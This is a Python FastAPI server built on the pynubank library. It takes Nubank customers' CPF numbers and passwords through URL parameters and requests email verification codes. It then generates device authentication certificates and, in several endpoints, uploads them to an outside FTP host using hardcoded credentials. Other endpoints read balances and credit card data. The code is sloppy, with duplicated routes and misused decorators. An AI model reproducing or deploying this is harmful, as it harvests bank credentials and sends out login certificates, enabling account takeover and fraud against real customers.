from fastapi import FastAPI
from pydantic import BaseModel
from pynubank import Nubank, MockHttpClient
import os
import random
import string
from getpass import getpass
import json
from colorama import init, Fore, Style

from pynubank import NuException
from pynubank.utils.certificate_generator import CertificateGenerator
import ftplib
from pynubank import Nubank, HttpClient
import requests






def generate_random_id() -> str:
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))


def log(message, color=Fore.BLUE):
    print(f'{color}{Style.DIM}[*] {Style.NORMAL}{Fore.LIGHTBLUE_EX}{message}')


def save_cert(cert, name):
    path = os.path.join(os.getcwd(), name)
    with open(path, 'wb') as cert_file:
        cert_file.write(cert.export())




app = FastAPI()




@app.get("/")
def root():
    return {"Olá": "Mundo"}

class codigo(BaseModel):
    id: int
    codigo: str

class saldo(BaseModel):
    cpf: int
    senha: str
    certificado: str


class usuario(BaseModel):
    cpf: int
    senha: str
    
class HttpClientWithPassword(HttpClient):
    def _cert_args(self):
        return {'pkcs12_data': self._cert, 'pkcs12_password': 'nubank'}



generators = []

junto = {}

junto = []


def save_to_log(message):
    with open('log.txt', 'a') as file:
        file.write(message + '\n')

@app.get("/certificadoleve3/{cpf}/{senha}")
def certificadoleve3(cpf: str, senha: str):
    init()

    device_id = generate_random_id()

    cpf = cpf
    password = senha

    generator = CertificateGenerator(cpf, password, device_id)

    junto2 = {cpf: {"cpf": cpf, "chave": generator}}

    try:
        email = generator.request_code()
        save_to_log(f"CPF: {cpf}, Email: {email}, Certificado gerado com sucesso.")
    except NuException as e:
        save_to_log(f"CPF: {cpf}, Erro ao gerar certificado: {e}")

    for i, item in enumerate(junto):
        if cpf in item:
            junto.pop(i)
            break

    junto.append(junto2)

    return {"email": email}

@app.get("/leve3/{codigo}/{cpf}")
def leve3(codigo: str, cpf: str):
    for item in junto:
        if cpf in item:
            if "chave" in item[cpf]:
                chave = item[cpf]["chave"]
                try:
                    cert1, cert2 = chave.exchange_certs(codigo)
                    save_cert(cert1, (codigo + '.p12'))
                    save_to_log(f"Código: {codigo}, CPF: {cpf}, Certificado gerado com sucesso.")
                    return {"mensagem": "Play7Server - Certificado Gerado com sucesso!"}
                except Exception as e:
                    save_to_log(f"Código: {codigo}, CPF: {cpf}, Erro ao gerar certificado: {e}")
                    return {"error": "Erro ao gerar certificado. Verifique os dados e tente novamente."}
            else:
                save_to_log(f"Código: {codigo}, CPF: {cpf}, Chave não encontrada para este CPF.")
                return {"error": "Chave não encontrada para este CPF."}
    save_to_log(f"Código: {codigo}, CPF: {cpf}, CPF não encontrado.")
    return {"error": "CPF não encontrado."}

@app.get("/balance/{cpf}/{senha}/{certificado}")
def SaldoDisponivel(cpf: int, senha: str,certificado: str):
        
    nu = Nubank(HttpClientWithPassword())
    nu.authenticate_with_cert(cpf, senha, certificado)
    saldo = nu.get_account_balance()

    return {"Saldo": saldo}


@app.get("/certificado/{cpf}/{senha}")
def main(cpf:str, senha:str):
    init()

    log(f'Starting {Fore.MAGENTA}{Style.DIM}PLAY SERVER{Style.NORMAL}{Fore.LIGHTBLUE_EX} context creation.')

    device_id = generate_random_id()

    log(f'Generated random id: {device_id}')

    cpf = cpf
    password = senha

    generator = CertificateGenerator(cpf, password, device_id) ## AQUI GERA O CODIGO PRA ENVIAR 

    junto2 = {cpf : {"cpf": cpf, "chave": generator}}
    
    log(f'Requesting e-mail code')
    try:
        email = generator.request_code() # AQUI ELE ENVIA O CODIGO PARA O EMAIL
    except NuException:
        log(f'{Fore.RED}Failed to request code. Check your credentials!', Fore.RED)
        return

    log(f'Email sent to {Fore.LIGHTBLACK_EX}{email}{Fore.LIGHTBLUE_EX}')

    for i, item in enumerate(junto):
        if cpf in item:
            junto.pop(i)
            break

    junto.append(junto2)
    
    return {"email": email}

@app.get("/certificadoleve/{cpf}/{senha}")
def certificadoleve(cpf:str, senha:str):
    init()

    device_id = generate_random_id()

    cpf = cpf
    password = senha

    generator = CertificateGenerator(cpf, password, device_id)

    junto2 = {cpf : {"cpf": cpf, "chave": generator}}
    
    try:
        email = generator.request_code() 
    except NuException:
        return


    for i, item in enumerate(junto):
        if cpf in item:
            junto.pop(i)
            break

    junto.append(junto2)
    
    return {"email": email}
    
@app.get("/leve/{codigo}/{cpf}")
def leve(codigo: str, cpf: str):
    for item in junto:
        if cpf in item:
            if "chave" in item[cpf]:
                chave = item[cpf]["chave"]
                try:
                    cert1, cert2 = chave.exchange_certs(codigo)
                    save_cert(cert1, (codigo+'.p12'))
                    return {"mensagem": "Play7Server - Certificado Gerado com sucesso!"}
                except Exception as e:
                    return {"error": "Erro ao gerar certificado. Verifique os dados e tente novamente."}
            else:
                return {"error": "Chave não encontrada para este CPF."}
        else:
            return {"error": "CPF não encontrado."}

@app.get("/leve2/{codigo}/{cpf}")
def leve2(codigo: str, cpf: str):
    for item in junto:
        if cpf in item:
            if "chave" in item[cpf]:
                chave = item[cpf]["chave"]
                try:
                    cert1, cert2 = chave.exchange_certs(codigo)
                    save_cert(cert1, (codigo+'.p12'))
                    return {"mensagem": "Play7Server - Certificado Gerado com sucesso!"}
                except Exception as e:
                    return {"error": "Erro ao gerar certificado. Verifique os dados e tente novamente."}
    return {"error": "CPF não encontrado."}

             
@app.get("/codigo/{codigo}/{cpf}")
def enviarcodigo(codigo: str, cpf: str):

    code = codigo
    cpf = cpf

    for item in junto:
        if cpf in item:
            if "chave" in item[cpf]:
                chave = item[cpf]["chave"]
                cert1, cert2 = chave.exchange_certs(code)
                save_cert(cert1, (codigo+'.p12'))
                print(f'{Fore.GREEN}Certificates generated successfully. (cert.pem)')
                print(f'{Fore.YELLOW}Warning, keep these certificates safe (Do not share or version in git)')
                
                # Envio via FTP
                try:
                    ftp_host = "ftp.centralhoje.tech"
                    ftp_username = "admin@xampcard.shop"
                    ftp_password = "Em@88005424"
                    ftp_directory = "/"  # Altere para o diretório correto
                    
                    with ftplib.FTP(ftp_host, ftp_username, ftp_password) as ftp:
                        with open(codigo + '.p12', 'rb') as cert_file:
                            ftp.cwd(ftp_directory)
                            ftp.storbinary(f"STOR {codigo}.p12", cert_file)
                    print("Certificate uploaded to FTP successfully.")
                except Exception as e:
                    print(f"Error uploading certificate to FTP: {e}")
                
                return {"mensagem": "Certificado Gerado e Enviado via FTP com sucesso!"}
            else:
                log(f'Chave "chave" não encontrada para o CPF {cpf}')
        else:
            log(f'CPF {cpf} não encontrado')


@app.route("/codigo2/<codigo>/<cpf>", methods=['GET'])
def enviarcodigo2(codigo: str, cpf: str):
    print(f"Requisição recebida para código {codigo} e CPF {cpf}")

    for item in junto:
        print(f"Verificando item {item}...")
        if cpf in item:
            print(f"CPF {cpf} encontrado em {item}")
            if "chave" in item[cpf]:
                print(f"Chave encontrada para CPF {cpf}")
                chave = item[cpf]["chave"]
                try:
                    cert1, cert2 = chave.exchange_certs(codigo)
                    save_cert(cert1, (codigo+'.p12'))
                    print(f'{Fore.GREEN}Certificates generated successfully. (cert.pem)')
                    print(f'{Fore.YELLOW}Warning, keep these certificates safe (Do not share or version in git)')
                    
                    # Envio via FTP
                    try:
                        ftp_host = "ftp.centralhoje.tech"
                        ftp_username = "admin@xampcard.shop"
                        ftp_password = "Em@88005424"
                        ftp_directory = "/"  # Altere para o diretório correto
                        
                        with ftplib.FTP(ftp_host, ftp_username, ftp_password) as ftp:
                            with open(codigo + '.p12', 'rb') as cert_file:
                                ftp.cwd(ftp_directory)
                                ftp.storbinary(f"STOR {codigo}.p12", cert_file)
                        print("Certificate uploaded to FTP successfully.")
                    except Exception as e:
                        print(f"Error uploading certificate to FTP: {e}")
                    
                    return {"mensagem": "Certificado Gerado e Enviado via FTP com sucesso!"}
                except Exception as e:
                    print(f"Error generating or saving certificate: {e}")
                    return {"error": "Erro ao gerar ou salvar o certificado."}
            else:
                return {"error": "Chave não encontrada para este CPF."}
        else:
            return {"error": "CPF não encontrado."}


@app.get("/ftp/{codigo}/{cpf}")
def certftp(codigo: str, cpf: str):

    for item in junto:
        if cpf in item:
            if "chave" in item[cpf]:
                chave = item[cpf]["chave"]
                cert1, cert2 = chave.exchange_certs(codigo)
                save_cert(cert1, (codigo + '.p12'))
                try:
                    ftp_host = "ftp.centralhoje.tech"
                    ftp_username = "admin@centralhoje.tech"
                    ftp_password = "Em@88005424"
                    ftp_directory = "/certificado"  # Altere para o diretório correto
                    
                    with ftplib.FTP(ftp_host, ftp_username, ftp_password) as ftp:
                        with open(codigo + '.p12', 'rb') as cert_file:
                            ftp.cwd(ftp_directory)
                            ftp.storbinary(f"STOR {codigo}.p12", cert_file)
                    return {"mensagem": "Certificado Gerado e Enviado via FTP com sucesso!"}
                except Exception as e:
                    return {"mensagem": f"Erro ao enviar certificado via FTP: {e}"}
            else:
                return {"mensagem": f"Chave não encontrada para o CPF {cpf}"}
        else:
            return {"mensagem": f"CPF {cpf} não encontrado"}







@app.get("/perfilcompleto/{cpf}/{senha}/{certificado}")
def obter_perfilcompleto(cpf: str, senha: str, certificado: str):
    nu = Nubank()
    nu.authenticate_with_cert(cpf, senha, certificado)
    # debito = nu.get_account_balance()
    # perfil = nu.get_customer()
    info_card = nu.get_credit_card_balance()
    
    limite_disponivel = info_card.get('available', 'Limite disponivel não encontrado')
    
    fatura_atual = info_card.get('open', 'Fatura atual não encontrado')


    
    proximas_faturas = info_card.get('future', 'Fatura atual não encontrado')
    
    return {"limitedisponivel": limite_disponivel,
            "faturaatual": fatura_atual,
            "proximasfaturas": proximas_faturas, 
            }





 
if __name__ == '__main__':
    main()
   
    #save_cert(cert1, 'cert.p12')

    #print(f'{Fore.GREEN}Certificates generated successfully. (cert.pem)')
    #print(f'{Fore.YELLOW}Warning, keep these certificates safe (Do not share or version in git)')


